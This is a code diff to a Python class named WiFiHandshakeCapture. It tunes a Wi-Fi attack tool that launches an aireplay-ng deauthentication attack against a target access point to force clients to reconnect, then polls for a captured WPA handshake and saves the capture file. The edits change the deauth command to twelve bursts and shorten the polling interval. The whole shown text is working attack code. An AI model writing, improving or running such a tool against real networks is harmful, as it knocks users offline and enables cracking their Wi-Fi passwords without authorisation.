@@ -135,7 +135,7 @@ class WiFiHandshakeCapture:
             self.processes.append(airodump_proc)
 
             # Start deauth attack
-            aireplay_cmd = f"sudo aireplay-ng -0 0 -a {bssid} {self.mon_interface}"
+            aireplay_cmd = f"sudo aireplay-ng -D -0 12 -a {bssid} {self.mon_interface}"
             aireplay_proc = subprocess.Popen(
                 ["xterm", "-title", f"Deauth: {name}", "-e", aireplay_cmd]
             )
@@ -157,7 +157,7 @@ class WiFiHandshakeCapture:
                     if "1 handshake" in result.stdout:
                         handshake_found = True
                         break
-                time.sleep(2)
+                time.sleep(0.5)
 
             if handshake_found:
                 os.system(f"sudo cp {cap_file} {self.capture_dir}/{output_file}.cap")
